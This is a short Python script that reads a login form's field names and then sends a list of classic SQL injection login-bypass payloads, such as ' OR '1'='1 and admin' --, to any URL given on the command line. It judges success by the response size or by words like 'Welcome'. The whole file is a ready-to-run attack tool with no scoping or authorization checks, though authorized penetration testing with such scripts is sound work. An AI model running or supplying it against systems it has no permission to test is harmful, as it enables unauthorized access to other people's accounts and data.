import requests
from bs4 import BeautifulSoup
import argparse

def get_login_fields(target_url):
    # Fetch the login page HTML
    response = requests.get(target_url)
    soup = BeautifulSoup(response.text, 'html.parser')
    
    # Look for the first form in the page
    form = soup.find('form')
    if not form:
        print("No form found on the page.")
        return None, None

    # Find all label and input pairs
    username_field = None
    password_field = None

    labels = form.find_all('label')
    for label in labels:
        label_text = label.get_text().lower()
        
        # Look for labels containing 'username' or 'password'
        if 'username' in label_text:
            input_field = label.find_next('input')
            if input_field:
                username_field = input_field.get('name', '')
                print(f"Found username field: {username_field}")
        elif 'password' in label_text:
            input_field = label.find_next('input')
            if input_field:
                password_field = input_field.get('name', '')
                print(f"Found password field: {password_field}")
    
    # If fields are found, return them; otherwise, return None
    return username_field, password_field

def test_sql_injection(target_url, username_field="username", password_field="password"):
    # Common SQL injection payloads
    payloads = [
        "' OR '1'='1",  # Always true condition
        "' OR '1'='1' -- ",
        "' OR '1'='1' #",
        "admin' -- ",
        "admin' #",
        "admin' OR '1'='1",
        "admin' OR '1'='1' -- "
    ]
    
    # Get baseline response size for incorrect login
    baseline_data = {
        username_field: "invalid_user",
        password_field: "invalid_pass"
    }
    baseline_response = requests.post(target_url, data=baseline_data)
    baseline_size = len(baseline_response.text)
    print(f"Baseline response size: {baseline_size} bytes (invalid login)")
    
    for payload in payloads:
        print(f"Testing payload: {payload}")
        data = {
            username_field: payload,
            password_field: "password"
        }
        
        response = requests.post(target_url, data=data)
        response_size = len(response.text)
        
        print(f"Response size: {response_size} bytes")
        
        # Optionally, print part of the response to help diagnose what's happening
        if len(response.text) < 500:
            print("Response snippet:", response.text[:200])  # Print first 200 characters if small enough
        
        # Checking if login was successful
        if "Welcome" in response.text or "Dashboard" in response.text or "Logout" in response.text or response_size != baseline_size:
            print(f"Possible SQL Injection vulnerability found! Payload: {payload}")
            return True
        
    print("No SQL Injection vulnerability detected with these payloads.")
    return False

if __name__ == "__main__":
    # Set up argument parsing
    parser = argparse.ArgumentParser(description="Test for SQL injection vulnerabilities.")
    parser.add_argument("target_url", help="The target URL of the login page to test.")
    args = parser.parse_args()

    # Get the field names dynamically from the target login page
    username_field, password_field = get_login_fields(args.target_url)
    
    if not username_field or not password_field:
        print("Could not find username or password fields in the login form.")
    else:
        # Run the SQL injection test on the specified target URL
        test_sql_injection(args.target_url, username_field, password_field)
